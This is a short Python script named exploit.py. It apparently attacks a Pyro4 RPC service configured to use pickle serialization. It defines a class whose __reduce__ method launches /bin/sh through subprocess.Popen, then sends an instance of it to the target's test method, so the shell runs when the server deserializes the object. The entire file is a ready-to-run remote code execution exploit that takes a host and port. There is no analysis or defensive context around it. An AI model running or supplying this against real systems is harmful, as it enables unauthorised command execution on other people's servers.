import subprocess
import Pyro4
import sys


class RunBinSh(object):
    def __reduce__(self):
        return (subprocess.Popen, (('/bin/sh', ),))


def main():
    if len(sys.argv) != 3:
        usage()
    host = sys.argv[1]
    port = int(sys.argv[2])
    Pyro4.config.SERIALIZER = "pickle"
    rpc = Pyro4.Proxy("PYRO:status@%s:%d" % (host, port))
    assert rpc.status() == "running"
    print rpc.test(RunBinSh())


def usage():
    print "Usage: python exploit.py <host> <port>"
    sys.exit(1)


if __name__ == "__main__":
    main()
